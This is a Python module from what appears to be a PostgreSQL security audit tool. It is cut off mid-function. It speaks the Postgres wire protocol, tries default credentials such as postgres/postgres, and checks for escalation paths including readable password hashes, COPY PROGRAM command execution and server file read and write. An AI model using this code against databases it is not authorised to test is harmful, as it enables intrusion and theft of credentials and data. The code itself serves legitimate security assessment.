"""postgres audit actions and compatibility helpers."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import socket
import sys
import time
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from ...console import Console
from ...rendering import BooleanColorRule, CountColorRule, render_colored_marker_line
from ...show_limits import (
    limit_metadata,
    limit_sequence,
)
from ...stage_runtime import (
    AuditHookContext,
    AuditRecord,
    StageTelemetryBuilder,
    invoke_action_hook_from_args,
    merge_stage_records,
)
from ...utils import (
    utc_now_iso,
)

_PG_PROTOCOL_VERSION = 196608
_PG_MAX_MESSAGE_SIZE = 16 * 1024 * 1024
_PG_HANDSHAKE_TYPES = {b"R", b"S", b"K", b"Z", b"E", b"N"}
_PG_IDENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_$]*$")
_STAGE_DETECT_PROTOCOL = "detect_protocol"
_STAGE_AUTH_INFERENCE = "auth_inference_credentials"
_STAGE_ACCESS_CAPABILITIES = "access_capabilities"
_STAGE_DATA = "data"
_POSTGRES_DEEP_STATUSES = {"open_no_auth", "weak_default_creds", "valid_credentials", "invalid_credentials_anonymous"}
_POSTGRES_DEFAULT_CREDENTIALS = (
    ("postgres", "postgres"),
    ("pgbouncer", "pgbouncer"),
)


class _PgAuditError(Exception):
    def __init__(
        self,
        message: str,
        *,
        detected: bool = False,
        auth_required: bool | None = None,
        auth_method: str | None = None,
        sqlstate: str | None = None,
    ) -> None:
        super().__init__(message)
        self.detected = detected
        self.auth_required = auth_required
        self.auth_method = auth_method
        self.sqlstate = sqlstate


@dataclass
class _PgSession:
    auth_required: bool
    auth_method: str | None
    server_version: str | None


@dataclass
class _ScramState:
    client_first_bare: str
    client_nonce: str
    expected_server_signature: str | None = None


def _clip(text: str, width: int = 64) -> str:
    if len(text) <= width:
        return text
    if width <= 3:
        return text[:width]
    return text[: width - 3] + "..."


def _retry_delay(attempt_index: int) -> float:
    return min(1.50, 0.20 * (2**attempt_index))


def _load_readline_module() -> Any | None:
    try:
        import readline  # noqa: PLC0415
    except Exception:
        return None
    try:
        readline.parse_and_bind("set bell-style none")
    except Exception:
        pass
    return readline


def _add_readline_history(readline_module: Any | None, line: str) -> None:
    if readline_module is None:
        return
    value = str(line or "").strip()
    if not value:
        return
    try:
        history_length = int(readline_module.get_current_history_length())
        if history_length > 0 and readline_module.get_history_item(history_length) == value:
            return
        readline_module.add_history(value)
    except Exception:
        return


def _is_timeout_error(value: Any) -> bool:
    text = str(value or "").strip().lower()
    if not text:
        return False
    return "connection timeout" in text or "timed out" in text or "timeout" in text


def _is_connection_timeout_fail_record(record: dict[str, Any]) -> bool:
    return str(record.get("status") or "") == "fail" and _is_timeout_error(record.get("error"))


def _is_connection_refused_error(value: Any) -> bool:
    text = str(value or "").strip().lower()
    return bool(text) and "connection refused" in text


def _is_connection_refused_fail_record(record: dict[str, Any]) -> bool:
    return str(record.get("status") or "") == "fail" and _is_connection_refused_error(record.get("error"))


def _recv_exact(sock: socket.socket, size: int) -> bytes:
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("unexpected EOF")
        data += chunk
    return data


def _pg_send_message(sock: socket.socket, message_type: bytes, payload: bytes) -> None:
    sock.sendall(message_type + (len(payload) + 4).to_bytes(4, "big") + payload)


def _pg_read_message(sock: socket.socket) -> tuple[bytes, bytes]:
    header = _recv_exact(sock, 5)
    message_type = header[:1]
    length = int.from_bytes(header[1:5], "big")
    if length < 4 or length > _PG_MAX_MESSAGE_SIZE:
        raise ValueError(f"invalid postgres message length: {length}")
    payload = _recv_exact(sock, length - 4)
    return message_type, payload


def _pg_send_startup(sock: socket.socket, username: str, database: str) -> None:
    user_raw = username.encode("utf-8", errors="replace")
    database_raw = database.encode("utf-8", errors="replace")
    body = (
        _PG_PROTOCOL_VERSION.to_bytes(4, "big")
        + b"user\x00"
        + user_raw
        + b"\x00"
        + b"database\x00"
        + database_raw
        + b"\x00"
        + b"client_encoding\x00UTF8\x00"
        + b"application_name\x00redposture\x00"
        + b"\x00"
    )
    sock.sendall((len(body) + 4).to_bytes(4, "big") + body)


def _pg_send_password(sock: socket.socket, password: str) -> None:
    _pg_send_message(sock, b"p", password.encode("utf-8", errors="replace") + b"\x00")


def _pg_send_sasl_initial(sock: socket.socket, mechanism: str, initial_response: str) -> None:
    mechanism_raw = mechanism.encode("utf-8", errors="replace")
    initial_raw = initial_response.encode("utf-8", errors="replace")
    payload = mechanism_raw + b"\x00" + len(initial_raw).to_bytes(4, "big") + initial_raw
    _pg_send_message(sock, b"p", payload)


def _pg_send_sasl_response(sock: socket.socket, response: str) -> None:
    _pg_send_message(sock, b"p", response.encode("utf-8", errors="replace"))


def _pg_send_query(sock: socket.socket, query: str) -> None:
    _pg_send_message(sock, b"Q", query.encode("utf-8", errors="replace") + b"\x00")


def _pg_send_terminate(sock: socket.socket) -> None:
    _pg_send_message(sock, b"X", b"")


def _pg_parse_error(payload: bytes) -> tuple[str | None, str]:
    sqlstate: str | None = None
    message: str | None = None
    idx = 0
    while idx < len(payload):
        key = payload[idx : idx + 1]
        idx += 1
        if key == b"\x00":
            break
        end = payload.find(b"\x00", idx)
        if end < 0:
            break
        value = payload[idx:end].decode("utf-8", errors="replace")
        idx = end + 1
        if key == b"C":
            sqlstate = value
        elif key == b"M":
            message = value
    return sqlstate, message or "postgres error"


def _pg_parse_parameter_status(payload: bytes) -> tuple[str | None, str | None]:
    try:
        key_raw, rest = payload.split(b"\x00", 1)
        value_raw, _ = rest.split(b"\x00", 1)
    except ValueError:
        return None, None
    return key_raw.decode("utf-8", errors="replace"), value_raw.decode("utf-8", errors="replace")


def _pg_parse_data_row(payload: bytes) -> list[str | None]:
    if len(payload) < 2:
        raise ValueError("invalid DataRow payload")
    columns = int.from_bytes(payload[0:2], "big")
    idx = 2
    row: list[str | None] = []
    for _ in range(columns):
        if idx + 4 > len(payload):
            raise ValueError("truncated DataRow payload")
        size = int.from_bytes(payload[idx : idx + 4], "big", signed=True)
        idx += 4
        if size == -1:
            row.append(None)
            continue
        if size < 0 or idx + size > len(payload):
            raise ValueError("invalid DataRow value length")
        row.append(payload[idx : idx + size].decode("utf-8", errors="replace"))
        idx += size
    return row


def _pg_query_rows(sock: socket.socket, query: str) -> tuple[list[list[str | None]], str | None]:
    rows: list[list[str | None]] = []
    error: str | None = None

    _pg_send_query(sock, query)
    while True:
        message_type, payload = _pg_read_message(sock)
        if message_type == b"D":
            rows.append(_pg_parse_data_row(payload))
            continue
        if message_type == b"E":
            _, error = _pg_parse_error(payload)
            continue
        if message_type == b"Z":
            return rows, error


def _parse_bool(value: str | None) -> bool | None:
    if value is None:
        return None
    normalized = value.strip().lower()
    if normalized in {"t", "true", "on", "1", "yes"}:
        return True
    if normalized in {"f", "false", "off", "0", "no"}:
        return False
    return None


def _pg_query_scalar_bool(sock: socket.socket, query: str) -> tuple[bool | None, str | None]:
    rows, error = _pg_query_rows(sock, query)
    if error:
        return None, error
    if not rows or not rows[0]:
        return None, "empty query result"
    value = _parse_bool(rows[0][0])
    if value is None:
        return None, f"invalid boolean value: {rows[0][0]}"
    return value, None


def _pg_query_scalar_int(sock: socket.socket, query: str) -> tuple[int | None, str | None]:
    rows, error = _pg_query_rows(sock, query)
    if error:
        return None, error
    if not rows or not rows[0]:
        return None, "empty query result"
    raw = rows[0][0]
    if raw is None:
        return None, "empty integer value"
    try:
        return int(raw), None
    except ValueError:
        return None, f"invalid integer value: {raw}"


def _escape_scram_username(username: str) -> str:
    return username.replace("=", "=3D").replace(",", "=2C")


def _parse_scram_fields(message: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for part in message.split(","):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        fields[key] = value
    return fields


def _scram_client_first(username: str) -> tuple[_ScramState, str]:
    nonce = base64.b64encode(secrets.token_bytes(18)).decode("ascii")
    first_bare = f"n={_escape_scram_username(username)},r={nonce}"
    return _ScramState(client_first_bare=first_bare, client_nonce=nonce), f"n,,{first_bare}"


def _scram_client_final(state: _ScramState, password: str, server_first: str) -> tuple[str, str]:
    fields = _parse_scram_fields(server_first)
    nonce = fields.get("r")
    salt_b64 = fields.get("s")
    iterations_raw = fields.get("i")
    if not nonce or not salt_b64 or not iterations_raw:
        raise _PgAuditError("invalid SCRAM challenge", detected=True, auth_required=True, auth_method="scram-sha-256")
    if not nonce.startswith(state.client_nonce):
        raise _PgAuditError("SCRAM nonce mismatch", detected=True, auth_required=True, auth_method="scram-sha-256")

    try:
        iterations = int(iterations_raw)
    except ValueError as exc:
        raise _PgAuditError(
            "invalid SCRAM iterations",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        ) from exc

    try:
        salt = base64.b64decode(salt_b64.encode("ascii"), validate=True)
    except Exception as exc:
        raise _PgAuditError(
            "invalid SCRAM salt",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        ) from exc

    salted_password = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8", errors="replace"), salt, iterations)
    client_key = hmac.new(salted_password, b"Client Key", hashlib.sha256).digest()
    stored_key = hashlib.sha256(client_key).digest()

    client_final_without_proof = f"c=biws,r={nonce}"
    auth_message = f"{state.client_first_bare},{server_first},{client_final_without_proof}"

    client_signature = hmac.new(stored_key, auth_message.encode("utf-8", errors="replace"), hashlib.sha256).digest()
    if len(client_key) != len(client_signature):
        raise _PgAuditError(
            "invalid SCRAM key/signature length",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )
    proof_bytes = bytes(left ^ client_signature[index] for index, left in enumerate(client_key))
    proof = base64.b64encode(proof_bytes).decode("ascii")

    server_key = hmac.new(salted_password, b"Server Key", hashlib.sha256).digest()
    server_signature = base64.b64encode(
        hmac.new(server_key, auth_message.encode("utf-8", errors="replace"), hashlib.sha256).digest()
    ).decode("ascii")

    final_message = f"{client_final_without_proof},p={proof}"
    return final_message, server_signature


def _scram_verify_server_final(state: _ScramState, server_final: str) -> None:
    fields = _parse_scram_fields(server_final)
    if "e" in fields:
        raise _PgAuditError(
            f"SCRAM server error: {fields['e']}",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )
    if state.expected_server_signature is None:
        raise _PgAuditError(
            "SCRAM state missing expected server signature",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )
    server_signature = fields.get("v")
    if server_signature != state.expected_server_signature:
        raise _PgAuditError(
            "SCRAM server signature mismatch",
            detected=True,
            auth_required=True,
            auth_method="scram-sha-256",
        )


def _pg_md5_password(username: str, password: str, salt: bytes) -> str:
    inner = hashlib.md5((password + username).encode("utf-8", errors="replace")).hexdigest().encode("ascii")
    outer = hashlib.md5(inner + salt).hexdigest()
    return f"md5{outer}"


def _parse_sasl_mechanisms(payload: bytes) -> list[str]:
    result: list[str] = []
    for chunk in payload.split(b"\x00"):
        if not chunk:
            continue
        result.append(chunk.decode("utf-8", errors="replace"))
    return result


def _pg_startup_and_auth(sock: socket.socket, username: str, password: str | None, database: str) -> _PgSession:
    _pg_send_startup(sock, username=username, database=database)

    detected = False
    authenticated = False
    auth_required = False
    auth_method: str | None = None
    server_version: str | None = None
    scram_state: _ScramState | None = None

    while True:
        message_type, payload = _pg_read_message(sock)
        if not detected and message_type not in _PG_HANDSHAKE_TYPES:
            raise _PgAuditError(f"unexpected response prefix: {message_type!r}", detected=False)

        if message_type == b"R":
            detected = True
            if len(payload) < 4:
                raise _PgAuditError("invalid authentication payload", detected=True)
            auth_code = int.from_bytes(payload[0:4], "big")

            if auth_code == 0:
                authenticated = True
                continue

            if auth_code == 3:
                auth_required = True
                auth_method = "cleartext"
                if password is None:
                    raise _PgAuditError(
                        "password authentication required",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                _pg_send_password(sock, password)
                continue

            if auth_code == 5:
                auth_required = True
                auth_method = "md5"
                if len(payload) < 8:
                    raise _PgAuditError(
                        "invalid MD5 authentication payload",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                if password is None:
                    raise _PgAuditError(
                        "md5 authentication required",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                _pg_send_password(sock, _pg_md5_password(username, password, payload[4:8]))
                continue

            if auth_code == 10:
                auth_required = True
                auth_method = "scram-sha-256"
                if password is None:
                    raise _PgAuditError(
                        "SCRAM authentication required",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                mechanisms = _parse_sasl_mechanisms(payload[4:])
                if "SCRAM-SHA-256" not in mechanisms:
                    raise _PgAuditError(
                        f"unsupported SASL mechanisms: {','.join(mechanisms) or '-'}",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                scram_state, client_first = _scram_client_first(username)
                _pg_send_sasl_initial(sock, "SCRAM-SHA-256", client_first)
                continue

            if auth_code == 11:
                auth_required = True
                auth_method = "scram-sha-256"
                if scram_state is None:
                    raise _PgAuditError(
                        "unexpected SCRAM continue",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                server_first = payload[4:].decode("utf-8", errors="replace")
                final_message, expected_signature = _scram_client_final(scram_state, password or "", server_first)
                scram_state.expected_server_signature = expected_signature
                _pg_send_sasl_response(sock, final_message)
                continue

            if auth_code == 12:
                auth_required = True
                auth_method = "scram-sha-256"
                if scram_state is None:
                    raise _PgAuditError(
                        "unexpected SCRAM final",
                        detected=True,
                        auth_required=True,
                        auth_method=auth_method,
                    )
                server_final = payload[4:].decode("utf-8", errors="replace")
                _scram_verify_server_final(scram_state, server_final)
                continue

            raise _PgAuditError(
                f"unsupported auth method: {auth_code}",
                detected=True,
                auth_required=True,
            )

        if message_type == b"S":
            detected = True
            key, value = _pg_parse_parameter_status(payload)
            if key == "server_version":
                server_version = value
            continue

        if message_type in {b"K", b"N"}:
            detected = True
            continue

        if message_type == b"E":
            detected = True
            sqlstate, message = _pg_parse_error(payload)
            auth_hint = auth_required
            if sqlstate in {"28P01", "28000"}:
                auth_hint = True
            if "password authentication failed" in message.lower():
                auth_hint = True
            raise _PgAuditError(
                message,
                detected=True,
                auth_required=auth_hint,
                auth_method=auth_method,
                sqlstate=sqlstate,
            )

        if message_type == b"Z":
            detected = True
            if not authenticated:
                authenticated = True
            return _PgSession(auth_required=auth_required, auth_method=auth_method, server_version=server_version)

        raise _PgAuditError(f"unexpected handshake message: {message_type!r}", detected=detected)


def _collect_postgres_privileges(
    sock: socket.socket,
) -> tuple[bool | None, bool | None, bool | None, int | None, str | None]:
    superuser, superuser_error = _pg_query_scalar_bool(
        sock,
        "SELECT COALESCE((SELECT rolsuper FROM pg_roles WHERE rolname = current_user), false)",
    )

    can_program, can_program_error = _pg_query_scalar_bool(
        sock,
        (
            "SELECT CASE "
            "WHEN EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'pg_execute_server_program') "
            "THEN pg_has_role(current_user, 'pg_execute_server_program', 'MEMBER') "
            "ELSE false "
            "END"
        ),
    )

    readable_tables, readable_tables_error = _pg_query_scalar_int(
        sock,
        (
            "SELECT COUNT(*) "
            "FROM information_schema.tables "
            "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') "
            "AND has_table_privilege(format('%I.%I', table_schema, table_name), 'SELECT')"
        ),
    )

    can_execute_commands: bool | None
    if superuser is None and can_program is None:
        can_execute_commands = None
    else:
        can_execute_commands = bool(superuser) or bool(can_program)

    can_read_tables: bool | None
    if readable_tables is None:
        can_read_tables = None
    else:
        can_read_tables = readable_tables > 0

    errors = [
        item
        for item in (
            superuser_error,
            can_program_error,
            readable_tables_error,
        )
        if item
    ]
    query_error = "; ".join(errors) if errors else None
    return superuser, can_execute_commands, can_read_tables, readable_tables, query_error


def _pg_bool_text(value: bool | None) -> str:
    return "True" if value is True else "False" if value is False else "unknown"


def _pg_privesc_role_membership(sock: socket.socket, role_name: str) -> tuple[bool | None, str | None]:
    return _pg_query_scalar_bool(
        sock,
        (
            "SELECT CASE "
            f"WHEN EXISTS (SELECT 1 FROM pg_roles WHERE rolname = {_pg_quote_literal(role_name)}) "
            f"THEN pg_has_role(current_user, {_pg_quote_literal(role_name)}, 'MEMBER') "
            "ELSE false "
            "END"
        ),
    )


def _pg_privesc_role_flag(sock: socket.socket, role_column: str) -> tuple[bool | None, str | None]:
    if role_column not in {"rolsuper", "rolcreaterole", "rolcreatedb"}:
        return None, f"unsupported role flag: {role_column}"
    return _pg_query_scalar_bool(
        sock,
        f"SELECT COALESCE((SELECT {role_column} FROM pg_roles WHERE rolname = current_user), false)",
    )


def _pg_privesc_function_executable(sock: socket.socket, signature: str) -> tuple[bool | None, str | None]:
    return _pg_query_scalar_bool(
        sock,
        (f"SELECT COALESCE(has_function_privilege(to_regprocedure({_pg_quote_literal(signature)}), 'EXECUTE'), false)"),
    )


def _pg_privesc_check_record(
    severity: str,
    check_id: str,
    name: str,
    description: str,
    vulnerable: bool | None,
    evidence: str,
    error: str | None = None,
) -> dict[str, Any]:
    return {
        "id": check_id,
        "severity": severity,
        "name": name,
        "description": description,
        "vulnerable": vulnerable,
        "evidence": evidence,
        "error": error,
    }


def _pg_privesc_summary(checks: list[dict[str, Any]]) -> dict[str, int]:
    summary = {"critical": 0, "high": 0, "medium": 0, "unknown": 0, "total": len(checks)}
    for item in checks:
        if item.get("vulnerable") is True:
            severity = str(item.get("severity") or "").lower()
            if severity in {"critical", "high", "medium"}:
                summary[severity] += 1
        elif item.get("vulnerable") is None:
            summary["unknown"] += 1
    return summary


def _pg_collect_privesc_checks(
    sock: socket.socket, superuser: bool | None
) -> tuple[list[dict[str, Any]], dict[str, int]]:
    checks: list[dict[str, Any]] = []

    if superuser is None:
        superuser, superuser_error = _pg_privesc_role_flag(sock, "rolsuper")
    else:
        superuser_error = None
    checks.append(
        _pg_privesc_check_record(
            "CRITICAL",
            "superuser_session",
            "Superuser session",
            "full database takeover via current superuser role",
            superuser,
            f"current_user rolsuper={_pg_bool_text(superuser)}",
            superuser_error,
        )
    )

    pg_shadow_readable, pg_shadow_error = _pg_query_scalar_bool(
        sock,
        (
            "SELECT CASE WHEN to_regclass('pg_catalog.pg_shadow') IS NULL THEN false "
            "ELSE has_table_privilege('pg_catalog.pg_shadow', 'SELECT') END"
        ),
    )
    checks.append(
        _pg_privesc_check_record(
            "CRITICAL",
            "pg_shadow_readable",
            "pg_shadow readable",
            "password hashes exposed",
            pg_shadow_readable,
            f"has SELECT on pg_catalog.pg_shadow={_pg_bool_text(pg_shadow_readable)}",
            pg_shadow_error,
        )
    )

    execute_role, execute_role_error = _pg_privesc_role_membership(sock, "pg_execute_server_program")
    copy_program = None if superuser is None and execute_role is None else bool(superuser) or bool(execute_role)
    copy_error = execute_role_error if execute_role is None and superuser is not True else None
    checks.append(
        _pg_privesc_check_record(
            "CRITICAL",
            "copy_program",
            "COPY TO/FROM PROGRAM",
            "OS command execution",
            copy_program,
            f"superuser={_pg_bool_text(superuser)} pg_execute_server_program={_pg_bool_text(execute_role)}",
            copy_error,
        )
    )

    read_server_files, read_server_error = _pg_privesc_role_membership(sock, "pg_read_server_files")
    pg_read_file = (
        None if superuser is None and read_server_files is None else bool(superuser) or bool(read_server_files)
    )
    checks.append(
        _pg_privesc_check_record(
            "HIGH",
            "pg_read_file",
            "pg_read_file()",
            "arbitrary server-side file read",
            pg_read_file,
            f"superuser={_pg_bool_text(superuser)} pg_read_server_files={_pg_bool_text(read_server_files)}",
            read_server_error if read_server_files is None and superuser is not True else None,
        )
    )

    checks.append(
        _pg_privesc_check_record(
            "HIGH",
            "pg_execute_server_program_role",
            "pg_execute_server_program role",
            "OS command execution via server program role",
            execute_role,
            f"pg_has_role(..., 'pg_execute_server_program', 'MEMBER')={_pg_bool_text(execute_role)}",
            execute_role_error,
        )
    )

    write_server_files, write_server_error = _pg_privesc_role_membership(sock, "pg_write_server_files")
    file_write = (
        None if superuser is None and write_server_files is None else bool(superuser) or bool(write_server_files)
    )
    checks.append(
        _pg_privesc_check_record(
            "HIGH",
            "pg_write_server_files_role",
            "pg_write_server_files role",
            "arbitrary server-side file write",
            file_write,
            f"superuser={_pg_bool_text(superuser)} pg_write_server_files={_pg_bool_text(write_server_files)}",
            write_server_error if write_server_files is None and superuser is not True else None,
        )
    )

    lo_import_exec, lo_import_error = _pg_privesc_function_executable(sock, "pg_catalog.lo_import(text)")
    lo_export_exec, lo_export_error = _pg_privesc_function_executable(sock, "pg_catalog.lo_export(oid,text)")
    lo_capable = (
        None
        if superuser is None and lo_import_exec is None and lo_export_exec is None
        else bool(superuser) or bool(lo_import_exec) or bool(lo_export_exec)
    )
    lo_errors = "; ".join(item for item in (lo_import_error, lo_export_error) if item) or None
    checks.append(
        _pg_privesc_check_record(
            "HIGH",
            "lo_import_export",
            "lo_import / lo_export",
            "large object file read/write",
            lo_capable,
            (
                f"superuser={_pg_bool_text(superuser)} lo_import_execute={_pg_bool_text(lo_import_exec)} "
                f"lo_export_execute={_pg_bool_text(lo_export_exec)}"
            ),
            lo_errors if lo_capable is None else None,
        )
    )

    createrole, createrole_error = _pg_privesc_role_flag(sock, "rolcreaterole")
    createrole_effective = None if superuser is None and createrole is None else bool(superuser) or bool(createrole)
    checks.append(
        _pg_privesc_check_record(
            "HIGH",
            "createrole",
            "CREATEROLE privilege",
            "role escalation",
            createrole_effective,
            f"superuser={_pg_bool_text(superuser)} rolcreaterole={_pg_bool_text(createrole)}",
            createrole_error if createrole is None and superuser is not True else None,
        )
    )

    createdb, createdb_error = _pg_privesc_role_flag(sock, "rolcreatedb")
    createdb_effective = None if superuser is None and createdb is None else bool(superuser) or bool(createdb)
    checks.append(
        _pg_privesc_check_record(
            "MEDIUM",
            "createdb",
            "CREATEDB privilege",
            "can create databases for staging further abuse",
            createdb_effective,
            f"superuser={_pg_bool_text(superuser)} rolcreatedb={_pg_bool_text(createdb)}",
            createdb_error if createdb is None and superuser is not True else None,
        )
    )

    security_definer_count, security_definer_error = _pg_query_scalar_int(
        sock,
        (
            "SELECT COUNT(*) FROM pg_proc p "
            "JOIN pg_namespace n ON n.oid = p.pronamespace "
            "WHERE p.prosecdef "
            "AND has_function_privilege(p.oid, 'EXECUTE') "
            "AND n.nspname NOT IN ('pg_catalog', 'information_schema')"
        ),
    )
    security_definer_examples: list[str] = []
    if isinstance(security_definer_count, int) and security_definer_count > 0:
        rows, examples_error = _pg_query_rows(
            sock,
            (
                "SELECT n.nspname || '.' || p.proname FROM pg_proc p "
                "JOIN pg_namespace n ON n.oid = p.pronamespace "
                "WHERE p.prosecdef "
                "AND has_function_privilege(p.oid, 'EXECUTE') "
                "AND n.nspname NOT IN ('pg_catalog', 'information_schema') "
                "ORDER BY 1 LIMIT 5"
            ),
        )
        if examples_error:
            security_definer_error = security_definer_error or examples_error
        else:
            security_definer_examples = [str(row[0]) for row in rows if row and row[0]]
    secdef_evidence = f"accessible SECURITY DEFINER functions={security_definer_count}"
    if security_definer_examples:
        secdef_evidence += f" examples={','.join(security_definer_examples)}"
    checks.append(
        _pg_privesc_check_record(
            "MEDIUM",
            "security_definer_accessible",
            "SECURITY DEFINER functions accessible",
            "callable privileged functions may expose escalation paths",
            None if security_definer_count is None else security_definer_count > 0,
            secdef_evidence,
            security_definer_error,
        )
    )

    create_db_privilege, create_db_error = _pg_query_scalar_bool(
        sock,
        "SELECT has_database_privilege(current_database(), 'CREATE')",
    )
    checks.append(
        _pg_privesc_check_record(
            "MEDIUM",
            "database_create_privilege",
            "CREATE privilege on database",
            "extension loading",
            create_db_privilege,
            f"has CREATE on current_database()={_pg_bool_text(create_db_privilege)}",
            create_db_error,
        )
    )

    return checks, _pg_privesc_summary(checks)


def _pg_query_readable_tables(sock: socket.socket) -> tuple[list[str] | None, str | None]:
    rows, error = _pg_query_rows(
        sock,
        (
            "SELECT table_schema, table_name "
            "FROM information_schema.tables "
            "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') "
            "AND has_table_privilege(format('%I.%I', table_schema, table_name), 'SELECT') "
            "ORDER BY table_schema, table_name"
        ),
    )
    if error:
        return None, error

    tables: list[str] = []
    for row in rows:
        if len(row) < 2:
            continue
        schema = str(row[0] or "").strip()
        name = str(row[1] or "").strip()
        if not schema or not name:
            continue
        tables.append(f"{schema}.{name}")
    return tables, None


def _pg_query_databases(sock: socket.socket) -> tuple[list[str] | None, str | None]:
    rows, error = _pg_query_rows(
        sock,
        ("SELECT datname FROM pg_database WHERE datistemplate = false ORDER BY datname"),
    )
    if error:
        return None, error

    databases: list[str] = []
    for row in rows:
        if not row:
            continue
        name = str(row[0] or "").strip()
        if name:
            databases.append(name)
    return databases, None


def _pg_query_accessible_databases(sock: socket.socket) -> tuple[list[str] | None, str | None]:
    rows, error = _pg_query_rows(
        sock,
        (
            "SELECT datname "
            "FROM pg_database "
            "WHERE datistemplate = false "
            "AND datallowconn = true "
            "AND has_database_privilege(datname, 'CONNECT') "
            "ORDER BY datname"
        ),
    )
    if error:
        return None, error

    databases: list[str] = []
    for row in rows:
        if not row:
            continue
        name = str(row[0] or "").strip()
        if name:
            databases.append(name)
    return databases, None


def _pg_quote_literal(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _pg_quote_ident(value: str) -> str:
    return '"' + value.replace('"', '""') + '"'


def _pg_split_quoted(raw: str, separator: str) -> list[str] | None:
    parts: list[str] = []
    buf: list[str] = []
    in_quote = False
    idx = 0
    while idx < len(raw):
        char = raw[idx]
        if char == '"':
            if in_quote and idx + 1 < len(raw) and raw[idx + 1] == '"':
                buf.append('""')
                idx += 2
                continue
            in_quote = not in_quote
            buf.append(char)
            idx += 1
            continue
        if char == separator and not in_quote:
            parts.append("".join(buf).strip())
            buf = []
            idx += 1
            continue
        buf.append(char)
        idx += 1
    if in_quote:
        return None
    parts.append("".join(buf).strip())
    return parts


def _pg_parse_identifier_part(raw: str) -> str | None:
    value = str(raw or "").strip()
    if not value:
        return None
    if value.startswith('"') or value.endswith('"'):
        if len(value) < 2 or not (value.startswith('"') and value.endswith('"')):
            return None
        inner = value[1:-1].replace('""', '"')
        return inner if inner else None
    return value if _PG_IDENT_RE.fullmatch(value) else None


def _pg_display_identifier_path(parts: list[str]) -> str:
    display_parts: list[str] = []
    for part in parts:
        if _PG_IDENT_RE.fullmatch(part):
            display_parts.append(part)
        else:
            display_parts.append(_pg_quote_ident(part))
    return ".".join(display_parts)


def _pg_parse_identifier_path(raw_name: str) -> list[str] | None:
    split_parts = _pg_split_quoted(raw_name, ".")
    if split_parts is None or any(not part for part in split_parts):
        return None
    parsed: list[str] = []
    for part in split_parts:
        parsed_part = _pg_parse_identifier_part(part)
        if parsed_part is None:
            return None
        parsed.append(parsed_part)
    return parsed


def _pg_split_csv_identifiers(raw_values: list[str]) -> list[str]:
    values: list[str] = []
    for raw_value in raw_values:
        split_parts = _pg_split_quoted(str(raw_value), ",")
        if split_parts is None:
            values.append(str(raw_value))
        else:
            values.extend(split_parts)
    return values


def _pg_normalize_table_name(raw_name: str) -> tuple[str | None, str | None, str | None]:
    candidate = (raw_name or "").strip()
    if not candidate:
        return None, None, "empty table name"

    parts = _pg_parse_identifier_path(candidate)
    if parts is None:
        if "." not in candidate and not (candidate.startswith('"') or candidate.endswith('"')):
            return None, None, f"unsupported table identifier: {candidate}"
        return None, None, f"invalid table format: {candidate}"
    if len(parts) not in {1, 2}:
        return None, None, f"invalid table format: {candidate}"

    display = _pg_display_identifier_path(parts)
    sql_ident = ".".join(_pg_quote_ident(part) for part in parts)
    return sql_ident, display, None


def _pg_parse_table_reference(raw_name: str) -> tuple[str | None, str | None, str | None]:
    candidate = (raw_name or "").strip()
    if not candidate:
        return None, None, "empty table name"

    parts = _pg_parse_identifier_path(candidate)
    if parts is None:
        if "." not in candidate and not (candidate.startswith('"') or candidate.endswith('"')):
            return None, None, f"unsupported table identifier: {candidate}"
        return None, None, f"invalid table format: {candidate}"
    if len(parts) not in {1, 2, 3}:
        return None, None, f"invalid table format: {candidate}"

    if len(parts) == 3:
        return _pg_display_identifier_path([parts[0]]), _pg_display_identifier_path(parts[1:]), None
    return None, _pg_display_identifier_path(parts), None


def _pg_group_table_targets(
    table_targets: list[str],
    selected_database: str | None,
) -> tuple[list[str], dict[str | None, list[str]], str | None]:
    grouped: dict[str | None, list[str]] = {}
    normalized_targets: list[str] = []
    seen_normalized_targets: set[str] = set()

    clean_selected_database = str(selected_database or "").strip() or None
    for raw_target in table_targets:
        database_name, local_table_name, error = _pg_parse_table_reference(raw_target)
        if error or local_table_name is None:
            return [], {}, error or f"invalid table target: {raw_target}"
        if clean_selected_database and database_name and database_name != clean_selected_database:
            return (
                [],
                {},
                f"--table database prefix '{database_name}' conflicts with --database {clean_selected_database}",
            )

        bucket_key = database_name or clean_selected_database
        bucket = grouped.setdefault(bucket_key, [])
        if local_table_name not in bucket:
            bucket.append(local_table_name)

        normalized_target = f"{database_name}.{local_table_name}" if database_name else local_table_name
        if normalized_target not in seen_normalized_targets:
            seen_normalized_targets.add(normalized_target)
            normalized_targets.append(normalized_target)

    return normalized_targets, grouped, None


def _pg_normalize_column_names(raw_values: list[str]) -> tuple[list[str], str | None]:
    normalized: list[str] = []
    seen: set[str] = set()
    for part in _pg_split_csv_identifiers(raw_values):
        name = _pg_parse_identifier_part(part)
        if name is None:
            return [], f"unsupported column identifier: {str(part).strip()}"
        if name in seen:
            continue
        seen.add(name)
        normalized.append(name)
    return normalized, None


def _pg_text(value: Any) -> str:
    return str(value if value is not None else "").replace("\n", "\\n")


def _pg_os_read_record_fields(
    os_read_path: str | None,
    *,
    attempted: bool = False,
    ok: bool | None = None,
    method: str | None = None,
    output: list[str] | None = None,
    error: str | None = None,
    attempts: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    return {
        "os_read_path": os_read_path,
